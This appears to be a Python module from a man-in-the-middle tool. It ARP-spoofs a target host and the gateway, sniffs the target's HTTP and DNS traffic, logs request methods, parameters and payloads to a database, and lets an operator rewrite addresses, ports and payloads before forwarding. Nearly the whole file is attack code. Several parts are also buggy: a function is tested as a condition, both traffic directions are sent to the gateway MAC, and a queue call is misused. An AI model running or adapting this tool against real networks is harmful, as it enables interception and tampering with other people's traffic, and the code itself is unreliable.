from scapy.all import *
from scapy.layers.dns import DNS
from scapy.layers.inet import IP, TCP
from threading import Lock
from scapy.layers.l2 import Ether, getmacbyip
from mitm.arpspoofer import ArpSpoofer
from mitm.database import DataBase
from queue import Queue
import re

NOT_SENT = Queue()
REQ_TYPES = ["get", "post", "head", "put", "delete", "connect", "options", "trace", "patch"]

def is_https(pack):
    return TCP in pack and (pack[TCP].sport == 443 or pack[TCP].dport == 443)

def is_http(pack):
    return Raw in pack and TCP in pack and (pack[TCP].sport == 80 or pack[TCP].dport == 80)

class Sniffer:

    def __init__(self, targetIP, gatewayIP, do_before_adding_to_database):
        self.spoofer = ArpSpoofer(targetIP, gatewayIP)
        self.db = DataBase(do_before_adding_to_database)
        self.packets = self.db.get_last()
        self.db.start()
        self.packets_lock = Lock()
        self.sendpac = True
        self.on = True

    def start_spoofing(self):
        if self.on:
            self.spoofer.start()

    def all_filter(self,packet):
        return IP in packet and (DNS in packet or (TCP in packet and (packet[TCP].sport == 80 or packet[TCP].dport == 80) or (UDP in packet and (packet[UDP].sport == 80 or packet[UDP].dport == 80))))

    def sniff_all(self):
        sniff(prn=self.navigate_packets, stop_filter=lambda x: not self.on)
        print("stopped")

    def set_on(self, set):
        if set=='stop':
            self.on = False

    def navigate_packets(self, pack: packet):
        if self.all_filter(pack):
            if self.is_from_victim(pack):
                self.handle_packets_from_victim(pack)
            elif self.is_from_router(pack):
                self.handle_packets_from_router(pack)

    def is_from_router(self, pack):
        return pack[IP].dst == self.spoofer.targetIP and pack[Ether].src == getmacbyip(self.spoofer.gatewayIP)

    def is_from_victim(self,pack):
        return pack[IP].src == self.spoofer.targetIP and pack[Ether].dst == self.spoofer.sourceMAC.replace("-",":").lower()

    def set_sendpac(self, bool):
        print("set senpac to: " + str(bool))
        self.sendpac = bool
        print(self.sendpac)

    def update_pack(self, packet_id, src_ip, dst_ip, req_type, req_params, data, src_port, dst_port):
        helpq = Queue()
        while not NOT_SENT.empty():
            p = NOT_SENT.get()
            if packet_id==p[1]:
                packet = p[0]
                if src_ip != None:
                    packet[IP].src = src_ip
                if dst_ip != None:
                    packet[IP].dst = dst_ip
                if req_type != None:
                    req = self.find_req_type(packet)
                    packet[Raw].replace(req, req_type)
                if data != None:
                    packet[Raw].load = data
                if req_params != None:
                    self.change_req_params(req_params, packet)
                if src_port != None:
                    packet[TCP].sport = src_port
                if dst_port != None:
                    packet[TCP].dport = dst_port
                p[0] = packet
            helpq.put(p)

        while not helpq.empty():
            NOT_SENT.put(helpq.get())

    def send_packet(self, packet):
        if Ether in packet and IP in packet:
            if self.is_from_victim(packet):
                # is from victim to router
                packet[Ether].dst = getmacbyip(self.spoofer.gatewayIP).replace("-", ":").upper()
                packet[Ether].src = self.spoofer.sourceMAC.replace("-", ":")
            elif self.is_from_router(packet):
                # if from router to victim
                packet[Ether].dst = getmacbyip(self.spoofer.gatewayIP).replace("-", ":").upper()
                packet[Ether].src = self.spoofer.sourceMAC.replace("-", ":")

            NOT_SENT.put(packet, self.packets-1)
            while self.sendpac and not NOT_SENT.empty():
                pac = NOT_SENT.get()
                sendp(pac[0], verbose=True)

    def check_rt(self, rt):
        for i in REQ_TYPES:
            if i == rt.lower():
                return True
        return False

    def find_req_type(self, packet):
        try:
            txt = packet[Raw].load.decode()
            list = txt.split()
            if self.check_rt(list[0]):
                return list[0]
        except UnicodeDecodeError:
            return None

    def find_req_param(self, packet):
        try:
            txt = packet[Raw].load.decode()
            list = txt.split()
            if self.check_rt(list[0]):
                return list[1]
        except:
            return None

    def change_req_params(self, req_params, packet):
        txt = packet[Raw].load
        list = txt.split()
        list[1] = req_params
        " ".join(list)
        packet[Raw].load = list

    def handle_https(self, pack):
        pass
        # TODO: handle this

    def handle_dns(self, pack):
        pass
        # TODO: handle this

    def handle_packets_from_victim(self, pack):
        if is_http(pack):
            self.db.write_to_victim(self.packets, pack[IP].src, pack[IP].dst, self.find_req_type(pack),
                                    self.find_req_param(pack), pack[Raw].load, pack[TCP].sport, pack[TCP].dport)
            with self.packets_lock:
                self.packets += 1
        elif is_https:
            self.handle_https(pack)
        elif DNS in pack:
            self.handle_dns(pack)

        self.send_packet(pack)

    def handle_packets_from_router(self, pack):
        if is_http(pack):
            self.db.write_to_router(self.packets, pack[IP].src, pack[IP].dst, self.find_req_type(pack),
                                    self.find_req_param(pack), pack[Raw].load, pack[TCP].sport, pack[TCP].dport)
            with self.packets_lock:
                self.packets += 1
        elif is_https:
            self.handle_https(pack)
        elif DNS in pack:
            self.handle_dns(pack)

        self.send_packet(pack)

